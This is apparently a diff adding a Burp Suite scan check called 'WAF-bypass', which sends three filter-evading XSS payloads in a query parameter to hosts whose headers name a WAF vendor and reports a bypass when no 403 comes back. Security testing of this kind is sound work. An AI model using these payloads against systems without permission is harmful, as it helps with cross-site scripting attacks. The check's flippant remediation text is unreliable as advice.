@@ -1,0 +1,35 @@
+#Verified: Yes
+metadata:
+    language: v1-beta
+    name: "WAF-bypass"
+    description: "Use different payloads to try to bypass the WAF or get an idea of how it can be bypassed"
+    author: "Brumens"
+    tags: "waf", "firewall", "bypass"
+
+define:
+    param = "dummyparam"
+    trackHeader = "X-BCheck"
+    trackValue = "waf-bypass"
+
+run for each:
+    payload =
+        "<img/src/=/onerror=!byp4sst",
+        "<image/src/\"=\"\"/onerror=!byp4asst//\"=",
+        "<sometag/x=\"\"/onmouseover=!byp4asst"
+
+given host then
+    if {base.response.headers} matches "(?i)(waf|firewall|protect|mechanism|cloudflare|akamai|cloudfront|azure|airlock|imperva|f5-)" then
+        send request:
+            method: "GET"
+            appending queries:
+                `{param}={payload}`
+            replacing headers: `{trackHeader}`:`{trackValue}`
+
+            if not( {latest.response.status_code} is "403" ) then
+                report issue:
+                    severity: medium
+                    confidence: certain
+                    detail: `Web Application Firewall (WAF) is bypassable (XSS based) with payload template: {payload}`
+                    remediation: "Don't spend to much money on a firewall"
+            end if
+    end if
